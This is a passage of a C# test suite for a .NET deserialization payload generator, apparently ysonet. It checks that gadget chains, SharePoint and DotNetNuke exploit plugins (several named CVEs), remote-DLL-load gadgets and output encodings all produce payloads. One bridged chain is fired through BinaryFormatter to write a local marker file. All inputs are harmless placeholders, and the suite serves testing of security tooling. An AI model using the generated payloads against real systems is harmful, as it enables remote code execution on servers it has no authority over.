                    InputArgs ia = new InputArgs();
                    ia.Cmd = SampleInputForGadget(g.CommandInput(), csFixture, dllFixture);

                    GenerationRequest req = new GenerationRequest
                    {
                        GadgetName = name,
                        FormatterName = formatter,
                        OutputFormat = "",
                        InputArgs = ia,
                    };

                    RunResult r = PayloadRunner.GenerateGadget(req);
                    AssertTrue(r.Success, "generate " + name + " (-f " + formatter + "): " + r.ErrorMessage);
                    AssertTrue(!RawIsEmpty(r.Raw), "non-empty payload for " + name + " (-f " + formatter + ")");
                }
            }
            finally
            {
                try { File.Delete(csFixture); } catch { }
            }
        }

        // A valid sample input for a gadget's declared command-input type. Nothing here
        // reaches the network; file/dll/source inputs point at local fixtures.
        private static string SampleInputForGadget(CommandInputType t, string csFixture, string dllFixture)
        {
            switch (t)
            {
                case CommandInputType.Ignored: return "";
                case CommandInputType.ShellCommand: return "calc.exe";
                case CommandInputType.Url: return "http://localhost/ysonet";
                case CommandInputType.FilePath: return csFixture;   // any existing local file
                case CommandInputType.CsSourceFile: return csFixture;
                case CommandInputType.DllPath: return dllFixture;
                default: return "calc.exe";
            }
        }

        // Reset a plugin's private static bool option flag so an in-process test is not
        // affected by a value a sibling test left behind (see note in the plugin sweep).
        private static void ResetStaticBool(Type t, string field)
        {
            var f = t.GetField(field, System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
            if (f != null && f.FieldType == typeof(bool)) f.SetValue(null, false);
        }

        private static bool RawIsEmpty(object raw)
        {
            if (raw == null) return true;
            byte[] b = raw as byte[];
            if (b != null) return b.Length == 0;
            string s = raw as string;
            if (s != null) return s.Length == 0;
            return false; // some other non-null object counts as produced
        }

        // Well-formedness check for a payload whose output is XML (soap, Net/DataContract,
        // XmlSerializer, XAML). Returns null when the payload is well-formed OR is not XML
        // output at all (binary, base64, JSON, YAML - those do not start with '<', so we skip
        // them); returns the parser error when the payload IS XML but does not parse. Used to
        // prove the minifier never produces malformed XML. Fragment conformance so a payload
        // that is a bare element (no XML declaration, as the minifier emits) is still accepted.
        private static string XmlWellFormednessError(object raw)
        {
            string text = raw as string;
            if (text == null && raw is byte[])
            {
                try { text = Encoding.UTF8.GetString((byte[])raw); } catch { return null; }
            }
            if (text == null) return null;
            text = text.Trim();
            if (text.Length > 0 && text[0] == (char)0xFEFF) text = text.Substring(1).Trim(); // drop a UTF-8 BOM
            if (text.Length == 0 || text[0] != '<') return null; // not XML output; nothing to check
            try
            {
                var settings = new System.Xml.XmlReaderSettings
                {
                    ConformanceLevel = System.Xml.ConformanceLevel.Fragment,
                    DtdProcessing = System.Xml.DtdProcessing.Ignore,
                };
                using (StringReader sr = new StringReader(text))
                using (System.Xml.XmlReader xr = System.Xml.XmlReader.Create(sr, settings))
                    while (xr.Read()) { }
                return null; // well-formed
            }
            catch (Exception ex) { return ex.Message; }
        }

        // Every plugin that can generate a payload offline must actually do so with
        // valid inputs. The remaining plugins are excluded explicitly with a reason.
        // A coverage guard fails if a plugin is neither generated nor excluded, so a
        // newly added plugin cannot silently skip this test.
        //
        // Plugins store parsed options in static fields, so runs are made deterministic
        // by passing the mode/format tokens each plugin relies on rather than trusting
        // defaults that an earlier run may have changed.
        private static void EverySafePluginGeneratesAPayload()
        {
            // Plugins keep parsed options in static fields and never reset them. In
            // production this is harmless (each ysonet.exe run is a fresh process), but
            // in-process a sibling test that runs ViewState with --examples leaves that
            // static flag on, which would block generation here. Clearing it keeps this
            // test order-independent. (Only ViewState's flag leaks across tests; every
            // other plugin below is run once with explicit tokens.)
            ResetStaticBool(typeof(ysonet.Plugins.ViewStatePlugin), "showExamples");

            // GetterCallGadgets reads its inner payload from a file (File.ReadAllText),
            // so it needs one that exists.
            string innerFixture = Path.Combine(Path.GetTempPath(), "ysonet_plugin_inner.json");
            File.WriteAllText(innerFixture, "{}");

            // Harmless hex keys (from the ViewState usage docs) for the crypto plugins.
            const string valKey = "70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0";
            const string decKey = "34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887";

            var argvByPlugin = new Dictionary<string, string[]>(StringComparer.OrdinalIgnoreCase)
            {
                { "Altserialization", new string[] { "-c", "calc.exe" } },
                { "ApplicationTrust", new string[] { "-c", "calc.exe" } },
                { "DotNetNuke", new string[] { "-m", "run_command", "-c", "calc.exe" } },
                { "GetterCallGadgets", new string[] { "-g", "PropertyGrid", "-i", innerFixture } },
                { "MachineKeySessionSecurityTokenHandler", new string[] { "-c", "calc.exe", "--validationkey", valKey, "--decryptionkey", decKey } },
                { "NetNonRceGadgets", new string[] { "-g", "PictureBox", "-f", "Json.NET", "-i", "http://localhost/y" } },
                { "Resx", new string[] { "-M", "BinaryFormatter", "-c", "calc.exe" } },
                { "SessionSecurityTokenHandler", new string[] { "-c", "calc.exe" } },
                { "SharePoint", new string[] { "--cve", "CVE-2018-8421", "-c", "calc.exe" } },
                { "ThirdPartyGadgets", new string[] { "-g", "UnmanagedLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" } },
                { "TransactionManagerReenlist", new string[] { "-c", "calc.exe" } },
                { "ViewState", new string[] { "--dryrun", "--validationkey", valKey } },
            };

            // Not generated here, each with the reason. Keeping this explicit forces a
            // new plugin to be classified (see the coverage guard below).
            var excluded = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                { "ActivatorUrl", "makes a live remoting/network call and returns a status string, not a payload" },
                { "Clipboard", "writes the OS clipboard on an STA thread; covered by dedicated clipboard tests" },
                { "Generic", "base plugin type, not a real plugin" },
            };

            try
            {
                foreach (KeyValuePair<string, string[]> kv in argvByPlugin)
                {
                    RunResult r = PayloadRunner.RunPlugin(kv.Key, kv.Value);
                    AssertTrue(r.Success, "plugin " + kv.Key + " runs: " + r.ErrorMessage);
                    AssertTrue(!RawIsEmpty(r.Raw), "plugin " + kv.Key + " produced a non-empty payload");
                }

                // Coverage guard: every discovered plugin is generated or excluded.
                foreach (string name in PluginRegistry.GetAllPluginNames())
                {
                    bool known = argvByPlugin.ContainsKey(name) || excluded.ContainsKey(name);
                    AssertTrue(known, "plugin " + name + " has no generation test and no explicit exclusion (add one)");
                }
            }
            finally
            {
                try { File.Delete(innerFixture); } catch { }
            }
        }

        // ================= FULL tier: exhaustive combination suite =================
        // These five tests never run on a normal Debug build (see Main's tier gate).
        // They GENERATE every gadget/plugin combination and, where a test-owned sink
        // can observe the effect, EXECUTE the payload and prove it fires. Standing
        // safety rule held everywhere below: every command is self-closing or is a
        // value that is never executed; every listener is loopback-only; every fixture
        // is a temp file cleaned up. Nothing opens calc or leaves an app running.

        // ---- 6.1 shared helpers ----

        // Encode raw output (string or byte[]) to every output encoding and assert each
        // is well-formed AND decodes back to the source bytes, so PayloadRunner.Encode is
        // proven for both raw kinds without multiplying the whole gadget matrix. The
        // "source bytes" mirror what Encode itself works from: ASCII bytes for a string
        // (Encode's base64/hex string paths use Encoding.ASCII.GetBytes), the bytes
        // themselves for a byte[].
        private static void EncodeAndVerify(object raw, string label)
        {
            bool isString = raw is string;
            byte[] source = isString ? Encoding.ASCII.GetBytes((string)raw) : (byte[])raw;
            int len;

            // raw: the input unchanged (UTF8 bytes for a string, the bytes for a byte[]).
            byte[] rawOut = PayloadRunner.Encode(raw, "raw", out len);
            AssertTrue(rawOut != null, label + ": raw encode is non-null");
            if (isString)
                AssertEqual((string)raw, Encoding.UTF8.GetString(rawOut), label + ": raw round-trips a string");
            else
                AssertTrue(BytesEqual(source, rawOut), label + ": raw round-trips bytes");

            // base64 and base64-urlencode: reverse the url-escapes, then FromBase64String
            // must reproduce the source bytes.
            foreach (string fmt in new string[] { "base64", "base64-urlencode" })
            {
                byte[] outBytes = PayloadRunner.Encode(raw, fmt, out len);
                AssertTrue(outBytes != null && outBytes.Length > 0, label + ": " + fmt + " is non-empty");
                string s = Encoding.ASCII.GetString(outBytes);
                if (fmt.Contains("urlencode"))
                    s = s.Replace("%2B", "+").Replace("%2F", "/").Replace("%3D", "=");
                byte[] decoded = Convert.FromBase64String(s);
                AssertTrue(BytesEqual(source, decoded), label + ": " + fmt + " decodes back to raw");
            }

            // hex: an even-length [0-9A-Fa-f] string that parses back to the source bytes.
            byte[] hexOut = PayloadRunner.Encode(raw, "hex", out len);
            AssertTrue(hexOut != null && hexOut.Length > 0, label + ": hex is non-empty");
            string hex = Encoding.ASCII.GetString(hexOut);
            AssertTrue(hex.Length % 2 == 0 && IsHex(hex), label + ": hex is even-length hex digits");
            AssertTrue(BytesEqual(source, HexToBytes(hex)), label + ": hex decodes back to raw");

            // raw-urlencode: for a string it URL-decodes back to the string. For a byte[]
            // the transform is inherently lossy (UTF8.GetString over arbitrary bytes), so
            // only assert it is non-empty.
            byte[] ruOut = PayloadRunner.Encode(raw, "raw-urlencode", out len);
            AssertTrue(ruOut != null, label + ": raw-urlencode is non-null");
            if (isString)
            {
                string ru = Encoding.UTF8.GetString(ruOut)
                    .Replace("%2B", "+").Replace("%2F", "/").Replace("%3D", "=");
                AssertEqual((string)raw, ru, label + ": raw-urlencode round-trips a string");
            }
            else
            {
                AssertTrue(ruOut.Length > 0, label + ": raw-urlencode of bytes is non-empty");
            }
        }

        private static bool IsHex(string s)
        {
            foreach (char c in s)
                if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
                    return false;
            return true;
        }

        private static byte[] HexToBytes(string hex)
        {
            byte[] b = new byte[hex.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return b;
        }

        // Reset every private static bool option flag on a plugin type, so a flag one
        // cell set (test/minify/usesimpletype/...) cannot leak into the next in-process cell.
        private static void ResetPluginStatics(Type t)
        {
            if (t == null) return;
            foreach (var f in t.GetFields(System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static))
                if (f.FieldType == typeof(bool))
                    f.SetValue(null, false);
        }

        // Write a temp fixture and return its path; the caller deletes it in a finally.
        private static string MakeTempFile(string name, string content)
        {
            string path = Path.Combine(Path.GetTempPath(), name);
            File.WriteAllText(path, content);
            return path;
        }

        // The gadget's own variant option token (--variant, or --internalgadget for
        // ResourceSet), matching Wizard.VariantFlag; used to pass a variant via ExtraArguments.
        private static string VariantFlagFor(IGenerator g)
        {
            foreach (OptionField f in OptionField.FromOptionSet(g.Options()))
                if (string.Equals(f.Name, "variant", StringComparison.OrdinalIgnoreCase)
                    || string.Equals(f.Name, "internalgadget", StringComparison.OrdinalIgnoreCase))
                    return f.CliFlag;
            return "--variant";
        }

        // A fresh InputArgs carrying a never-executed shell command (Test=false).
        private static InputArgs CalcInput()
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            return ia;
        }

        // ---- 6.2 gadget generation matrix ----

        // Every gadget x every supported formatter x every variant, crossed with minify
        // off/on, must produce a non-empty payload (Test=false, so nothing executes). A
        // new gadget/formatter/variant is picked up automatically. Cells that are
        // advertised but cannot generate in this environment go in expectedGadgetSkips
        // with a written reason; it starts empty (the one known advertised-but-broken
        // combo, ObjRef+ObjectStateFormatter, was fixed by removing OSF from ObjRef).
        private static void GadgetFullMatrixGenerates()
        {
            // Cells that are advertised but CANNOT generate because of a fundamental
            // serializer limitation. We do NOT skip these silently: the matrix asserts each
            // fails with the expected error, so the limitation is tested and any behavior
            // change (it starts working, or fails differently) is caught. Key forms:
            // "Gadget|Formatter", "Gadget|Formatter|variantN" (both match either minify state),
            // or the same with a trailing "|minify" to scope to the minified pass only.
            var expectedGadgetFailures = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                // SoapFormatter cannot serialize a generic type. Variant 1 of these gadgets is
                // TypeConfuseDelegate, whose payload contains a generic SortedSet, so no Soap
                // payload can be produced; variant 2 (TextFormattingRunProperties) is not generic
                // and serializes fine. Per-variant formatter support (GadgetVariant.Without +
                // GuardVariantFormatter) now catches this pair up front, so we assert the guard's
                // stable phrase - proving the guard fires BEFORE the deep framework exception and
                // the impossible combo is still tested (not silently skipped).
                { "ActivitySurrogateDisableTypeCheck|SoapFormatter|variant1",
                    "is not supported by variant 1" },
                { "XamlAssemblyLoadFromFile|SoapFormatter|variant1",
                    "is not supported by variant 1" },
            };

            // Cells whose MINIFIED output is XML but intentionally NOT standalone well-formed,
            // so the minified-XML parse check below skips them. Only ResourceSet's
            // NetDataContractSerializer path: its generator passes "</Values></Table></w>" as a
            // discardable string, deliberately dropping those trailing closing tags to shrink the
            // payload (see ResourceSetGenerator.cs). The NetDataContractSerializer deserializer
            // tolerates the truncated document - the generator's own -t path deserializes it - so
            // this is by design, not a minifier bug. Keyed by "gadget|formatter".
            var wellFormedExempt = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                "ResourceSet|NetDataContractSerializer",
            };

            string csFixture = MakeTempFile("ysonet_matrix_fixture.cs",
                "public class YsonetTestFixture { public YsonetTestFixture() { } }");
            string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;

            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
            var failures = new List<string>();
            int cells = 0;
            int expectedFailures = 0;
            try
            {
                foreach (string name in GadgetRegistry.GetAllGadgetNames())
                {
                    if (name == "Generic") continue;
                    if (trace) { Console.Error.WriteLine("  [matrix] " + name); Console.Error.Flush(); }
                    IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                    AssertTrue(g != null, "gadget loads: " + name);

                    var formatters = new List<string>();
                    foreach (string entry in g.SupportedFormatters())
                    {
                        string f = entry.Split(' ')[0];
                        if (!formatters.Contains(f)) formatters.Add(f);
                    }

                    var variants = g.Variants();
                    string variantFlag = VariantFlagFor(g);
                    int variantCount = (variants == null || variants.Count == 0) ? 1 : variants.Count;

                    foreach (string formatter in formatters)
                    {
                        for (int vi = 0; vi < variantCount; vi++)
                        {
                            GadgetVariant variant = (variants == null || variants.Count == 0) ? null : variants[vi];

                            for (int m = 0; m < 2; m++)
                            {
                                bool minify = m == 1;
                                CommandInputType inType = (variant == null)
                                    ? g.CommandInput() : variant.EffectiveInput(g.CommandInput());

                                string expectedError = ExpectedGadgetFailure(expectedGadgetFailures, name, formatter, variant, minify);

                                InputArgs ia = new InputArgs();
                                ia.Cmd = SampleInputForGadget(inType, csFixture, dllFixture);
                                ia.Minify = minify;
                                ia.Test = false;
                                // Pass the variant plus a xamlurl: the 3rd (SSRF) variant of
                                // ObjectDataProvider (and WindowsClaimsIdentity, which reuses it)
                                // needs a xamlurl, not a shell command; gadgets without that option
                                // ignore the extra argument.
                                var extra = new List<string>();
                                if (variant != null) { extra.Add(variantFlag); extra.Add(variant.Number.ToString()); }
                                extra.Add("--xamlurl"); extra.Add("http://127.0.0.1/x");
                                ia.ExtraArguments = extra;

                                GenerationRequest req = new GenerationRequest
                                {
                                    GadgetName = name,
                                    FormatterName = formatter,
                                    OutputFormat = "",
                                    InputArgs = ia,
                                };

                                cells++;
                                string cellDesc = name + " -f " + formatter
                                    + (variant == null ? "" : " v" + variant.Number)
                                    + (minify ? " (minify)" : "");
                                if (trace) { Console.Error.WriteLine("    [cell] " + cellDesc + (expectedError != null ? " [expect-fail]" : "")); Console.Error.Flush(); }

                                RunResult r;
                                try { r = PayloadRunner.GenerateGadget(req); }
                                catch (Exception ex) { r = RunResult.Fail("THREW " + ex.Message); }

                                if (expectedError != null)
                                {
                                    // A known-impossible combination: assert it fails with the
                                    // expected error, so the limitation is tested (not ignored).
                                    if (r.Success)
                                        failures.Add(cellDesc + " -> expected the '" + expectedError + "' limitation but generation SUCCEEDED (the limitation may be gone; update the test)");
                                    else if ((r.ErrorMessage ?? "").IndexOf(expectedError, StringComparison.OrdinalIgnoreCase) < 0)
                                        failures.Add(cellDesc + " -> failed with an UNEXPECTED error (wanted '" + expectedError + "'): " + r.ErrorMessage);
                                    else
                                        expectedFailures++;
                                }
                                else
                                {
                                    if (!r.Success) failures.Add(cellDesc + " -> " + r.ErrorMessage);
                                    else if (RawIsEmpty(r.Raw)) failures.Add(cellDesc + " -> empty payload");
                                    else if (minify && !wellFormedExempt.Contains(name + "|" + formatter))
                                    {
                                        // A minified payload whose output is XML must stay well-formed
                                        // XML - the minifier must never break it. Non-XML outputs
                                        // (binary/base64/JSON/YAML) are skipped by the helper; the
                                        // documented intentional-fragment cells are exempt above.
                                        string xmlErr = XmlWellFormednessError(r.Raw);
                                        if (xmlErr != null)
                                            failures.Add(cellDesc + " -> minified XML is not well-formed: " + xmlErr);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            finally
            {
                try { File.Delete(csFixture); } catch { }
            }

            AssertTrue(cells > 100, "matrix exercised many cells (was " + cells + ")");
            AssertTrue(expectedFailures >= 2,
                "the known SoapFormatter-generics limitation cells were exercised (was " + expectedFailures + ")");
            AssertTrue(failures.Count == 0,
                "gadget matrix cells failed (" + failures.Count + " of " + cells + "; " + expectedFailures + " expected-failures verified):\n  "
                + string.Join("\n  ", failures.ToArray()));
        }

        // Look up the expected-failure error for a matrix cell, or null if the cell should
        // generate. Checks the most specific key first (variant + minify) down to the gadget
        // + formatter, so a "Gadget|Formatter|variantN" entry matches both minify states.
        private static string ExpectedGadgetFailure(Dictionary<string, string> map, string name, string formatter, GadgetVariant variant, bool minify)
        {
            string vk = variant == null ? "" : "|variant" + variant.Number;
            var keys = new List<string>();
            if (minify)
            {
                keys.Add(name + "|" + formatter + vk + "|minify");
                keys.Add(name + "|" + formatter + "|minify");
            }
            keys.Add(name + "|" + formatter + vk);
            keys.Add(name + "|" + formatter);
            foreach (string k in keys)
            {
                string v;
                if (map.TryGetValue(k, out v)) return v;
            }
            return null;
        }

        // ---- 6.5 output encodings per formatter ----

        // Prove every output encoding is correct for every FORMATTER, using one
        // representative gadget per unique formatter (no need to multiply the gadget
        // matrix by encodings). ObjectStateFormatter is intentionally offered by no
        // gadget (it equals LosFormatter without a MAC), so it is absent here by design.
        private static void OutputEncodingPerFormatter()
        {
            var reps = new List<string[]>
            {
                new[] { "ObjectDataProvider", "Xaml" },
                new[] { "ObjectDataProvider", "Json.NET" },
                new[] { "ObjectDataProvider", "FastJson" },
                new[] { "ObjectDataProvider", "JavaScriptSerializer" },
                new[] { "ObjectDataProvider", "XmlSerializer" },
                new[] { "ObjectDataProvider", "DataContractSerializer" },
                new[] { "ObjectDataProvider", "YamlDotNet" },
                new[] { "ObjectDataProvider", "FsPickler" },
                new[] { "ObjectDataProvider", "SharpSerializerBinary" },
                new[] { "ObjectDataProvider", "SharpSerializerXml" },
                new[] { "ObjectDataProvider", "MessagePackTypeless" },
                new[] { "ObjectDataProvider", "MessagePackTypelessLz4" },
                new[] { "TypeConfuseDelegate", "BinaryFormatter" },
                new[] { "TypeConfuseDelegate", "NetDataContractSerializer" },
                new[] { "TypeConfuseDelegate", "LosFormatter" },
                new[] { "TextFormattingRunProperties", "SoapFormatter" },
                new[] { "WindowsPrincipal", "DataContractJsonSerializer" },
            };

            foreach (string[] rep in reps)
            {
                GenerationRequest req = new GenerationRequest
                {
                    GadgetName = rep[0],
                    FormatterName = rep[1],
                    OutputFormat = "",
                    InputArgs = CalcInput(),
                };
                RunResult r = PayloadRunner.GenerateGadget(req);
                AssertTrue(r.Success && !RawIsEmpty(r.Raw),
                    "generate " + rep[0] + " -f " + rep[1] + ": " + r.ErrorMessage);

                // The empty/auto output format must resolve to the default rule
                // (base64 for the binary-ish formatters, raw for the text ones).
                AssertEqual(PayloadRunner.GetDefaultOutputFormat(rep[1]), r.EffectiveOutputFormat,
                    rep[1] + " default output format");

                EncodeAndVerify(r.Raw, rep[0] + "/" + rep[1]);
            }

            // Both plugin output shapes: ApplicationTrust returns a string, and
            // TransactionManagerReenlist returns a byte[] (calc.exe is never executed here).
            ResetPluginStatics(typeof(ysonet.Plugins.ApplicationTrustPlugin));
            RunResult at = PayloadRunner.RunPlugin("ApplicationTrust", new string[] { "-c", "calc.exe" });
            AssertTrue(at.Success && at.Raw is string, "ApplicationTrust returns a string payload: " + at.ErrorMessage);
            EncodeAndVerify(at.Raw, "plugin/ApplicationTrust(string)");

            ResetPluginStatics(typeof(ysonet.Plugins.TransactionManagerReenlistPlugin));
            RunResult tm = PayloadRunner.RunPlugin("TransactionManagerReenlist", new string[] { "-c", "calc.exe" });
            AssertTrue(tm.Success && tm.Raw is byte[], "TransactionManagerReenlist returns a byte[] payload: " + tm.ErrorMessage);
            EncodeAndVerify(tm.Raw, "plugin/TransactionManagerReenlist(byte[])");
        }

        // ---- 6.6 bridged gadget chains (--bgc) ----

        // The --bgc mechanism is otherwise untested. Every consumer tagged Bridged with
        // a real SupportedBridgedFormatter() must generate a chain leaf,consumer; the two
        // known non-consumers must be rejected; and one chain must fire end to end.
        private static void BridgedChainsGenerate()
        {
            var failures = new List<string>();
            int consumers = 0;
            foreach (string name in GadgetRegistry.GetAllGadgetNames())
            {
                if (name == "Generic") continue;
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                if (g == null || !g.Labels().Contains(GadgetTags.Bridged)) continue;
                string bridgedFmt = g.SupportedBridgedFormatter();
                if (string.IsNullOrEmpty(bridgedFmt)) continue; // e.g. WindowsPrincipal reports None

                consumers++;
                // The leaf must produce the consumer's expected bridged formatter.
                string leaf = bridgedFmt.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)
                    ? "TextFormattingRunProperties" : "TypeConfuseDelegate";
                string finalFmt = g.SupportedFormatters()[0].Split(' ')[0];

                GenerationRequest req = new GenerationRequest
                {
                    GadgetName = name,
                    BridgedGadgetChain = leaf,
                    FormatterName = finalFmt,
                    OutputFormat = "",
                    InputArgs = CalcInput(),
                };
                RunResult r = PayloadRunner.GenerateGadget(req);
                if (!r.Success || RawIsEmpty(r.Raw))
                    failures.Add(leaf + "," + name + " -f " + finalFmt + " -> " + (r.Success ? "empty" : r.ErrorMessage));
            }

            AssertTrue(consumers >= 13, "found the bridged consumers (was " + consumers + ")");
            AssertTrue(failures.Count == 0,
                "bridged chains failed (" + failures.Count + "):\n  " + string.Join("\n  ", failures.ToArray()));

            // WindowsPrincipal is Bridged-labelled but declares no bridged formatter (None),
            // so it must be rejected as a bridge consumer.
            RunResult wp = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "WindowsPrincipal",
                BridgedGadgetChain = "TypeConfuseDelegate",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = CalcInput(),
            });
            AssertTrue(!wp.Success, "WindowsPrincipal is rejected as a bridge consumer (no bridged formatter)");

            // DataSetOldBehaviourFromFile is not tagged Bridged, so it must be rejected too.
            RunResult dsff = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "DataSetOldBehaviourFromFile",
                BridgedGadgetChain = "TypeConfuseDelegate",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = CalcInput(),
            });
            AssertTrue(!dsff.Success, "DataSetOldBehaviourFromFile is rejected as a bridge consumer (not tagged Bridged)");

            // One bridged chain must actually execute end to end: TypeConfuseDelegate
            // wrapped in AxHostState, fired via BinaryFormatter into a marker sink.
            string marker = Path.Combine(Path.GetTempPath(), "ysonet_bgc_fire.txt");
            if (File.Exists(marker)) File.Delete(marker);
            try
            {
                InputArgs fa = new InputArgs();
                fa.Cmd = "cmd /c echo x > \"" + marker + "\"";
                fa.IsRawCmd = true;
                fa.Test = false;
                RunResult fr = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = "AxHostState",
                    BridgedGadgetChain = "TypeConfuseDelegate",
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = fa,
                });
                AssertTrue(fr.Success && fr.Raw is byte[], "bridged chain generated for firing: " + fr.ErrorMessage);
                RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])fr.Raw); });
                AssertTrue(WaitForFile(marker, 2500), "the bridged chain TypeConfuseDelegate,AxHostState fired end to end");
            }
            finally
            {
                if (File.Exists(marker)) File.Delete(marker);
            }
        }

        // ---- 6.4 plugin combination matrix ----

        // One curated row per plugin mode / CVE / inner-gadget (plugin modes are not
        // machine-enumerable: they live in NDesk OptionSet lambda strings and Run()
        // switch bodies). Each row must generate a non-empty payload, crossed with
        // minify off/on where the plugin exposes a minify option. A coverage guard over
        // every discovered plugin fails the build if a plugin is neither in the matrix
        // nor explicitly excluded, so a whole new plugin cannot slip through (a new
        // plugin MODE still has to be added here by hand, by design).
        private class PluginCell
        {
            public string Plugin;
            public string[] Argv;
            public PluginCell(string plugin, string[] argv) { Plugin = plugin; Argv = argv; }
        }

        private static void PluginFullMatrixGenerates()
        {
            // Harmless hex keys (from the ViewState usage docs) for the crypto plugins.
            const string vk = "70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0";
            const string dk = "34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887";

            string innerJson = MakeTempFile("ysonet_pmatrix_inner.json", "{}");
            string tpqpInner = MakeTempFile("ysonet_pmatrix_tpqp.json", "{}");
            string csFixture = MakeTempFile("ysonet_pmatrix_fixture.cs",
                "public class YsonetTestFixture { public YsonetTestFixture() { } }");
            string resxOut = Path.Combine(Path.GetTempPath(), "ysonet_pmatrix.resources");

            var rows = new List<PluginCell>
            {
                new PluginCell("Altserialization", new[] { "-M", "HttpStaticObjectsCollection", "-c", "calc.exe" }),
                new PluginCell("Altserialization", new[] { "-M", "SessionStateItemCollection", "-c", "calc.exe" }),

                new PluginCell("ApplicationTrust", new[] { "-c", "calc.exe" }),

                new PluginCell("DotNetNuke", new[] { "-m", "run_command", "-c", "calc.exe" }),
                new PluginCell("DotNetNuke", new[] { "-m", "read_file", "-f", "web.config" }),
                new PluginCell("DotNetNuke", new[] { "-m", "write_file", "-f", "web.config", "-u", "http://localhost/x" }),

                new PluginCell("GetterCallGadgets", new[] { "-g", "PropertyGrid", "-i", innerJson }),
                new PluginCell("GetterCallGadgets", new[] { "-g", "ListBox", "-m", "Items", "-i", innerJson }),
                new PluginCell("GetterCallGadgets", new[] { "-g", "CheckedListBox", "-m", "Items", "-i", innerJson }),
                new PluginCell("GetterCallGadgets", new[] { "-g", "ComboBox", "-m", "Items", "-i", innerJson }),

                new PluginCell("MachineKeySessionSecurityTokenHandler", new[] { "-c", "calc.exe", "--validationkey", vk, "--decryptionkey", dk }),

                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Json.NET", "-i", "http://localhost/y" }),
                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Xaml", "-i", "http://localhost/y" }),
                new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "Json.NET", "-i", "http://localhost/y" }),
                new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
                new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "Xaml", "-i", "http://localhost/y" }),
                new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "Json.NET", "-i", "http://localhost/y" }),
                new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
                new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "Xaml", "-i", "http://localhost/y" }),

                new PluginCell("Resx", new[] { "-M", "BinaryFormatter", "-c", "calc.exe" }),
                new PluginCell("Resx", new[] { "-M", "SoapFormatter", "-c", csFixture }),
                new PluginCell("Resx", new[] { "-M", "indirect_resx_file", "-F", "\\\\host\\share\\a.resx" }),
                new PluginCell("Resx", new[] { "-M", "CompiledDotResources", "-c", "calc.exe", "-of", resxOut }),

                new PluginCell("SessionSecurityTokenHandler", new[] { "-c", "calc.exe" }),

                new PluginCell("SharePoint", new[] { "--cve", "CVE-2018-8421", "-c", "calc.exe" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2018-8421", "-c", "http://localhost/x", "--useurl" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2019-0604", "-c", "calc.exe" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-49704", "-c", "calc.exe", "--variant", "1" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-49704", "-c", csFixture, "--variant", "2" }),
                // CVE-2025-53770 (ToolShell patch bypass) compiles -c as a .cs file, like 49704 variant 2.
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-53770", "-c", csFixture }),

                // Remote-DLL-load gadgets with a natural UNC path: the plugin JSON-escapes the
                // input by default now, so the backslashes survive generation and the --minify
                // re-parse (previously \\host\a.dll embedded an invalid \a JSON escape).
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "UnmanagedLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "WindowsLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "Xunit1Executor", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
